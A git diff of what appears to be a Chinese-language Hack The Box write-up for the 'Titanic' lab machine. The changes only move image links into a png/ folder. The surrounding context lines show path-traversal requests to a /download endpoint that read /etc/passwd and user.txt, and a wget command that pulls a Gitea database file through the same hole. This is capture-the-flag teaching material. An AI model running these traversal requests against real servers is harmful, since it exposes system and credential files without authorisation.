@@ -1,4 +1,4 @@
-![](Titanic.png)
+![](png/Titanic.png)
 # Titanic
 ### Linux · Easy
 #### from https://app.hackthebox.com/machines/648
@@ -38,10 +38,10 @@ Found: dev.titanic.htb Status: 200 [Size: 13982]
 /download             (Status: 400) [Size: 41]
 /book                 (Status: 405) [Size: 153]
 ```
-![](1.png)
-![](2.png)
+![](png/1.png)
+![](png/2.png)
 ### 直接尝试文件包含
-![](3.png)
+![](png/3.png)
 ```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -86,7 +86,7 @@ GET /download?ticket=../../../../home/developer/user.txt
 ```
 ### 继续进行ROOT
 #### 我们发现dev.titanic.htb是一个gitea,注册后发现有两个库
-![](4.png)
+![](png/4.png)
 #### 在docker-config/gitea/docker-compose.yml中,我们发现这个
 ```
 version: '3'
@@ -106,8 +106,8 @@ services:
     restart: always
 ```
 ### /home/developer/gitea/data 是搭建gitea的地方,而且是本地搭建,让我们使用前面的LFI来拼接目录读取app.ini
-![](5.png)
-![](6.png)
+![](png/5.png)
+![](png/6.png)
 ```
 ☠️$ wget -O gitea.db "http://titanic.htb/download?ticket=./../../../home/developer/gitea/data/gitea/gitea.db"
 ☠️$ sqlite3 gitea.db                                                                                         
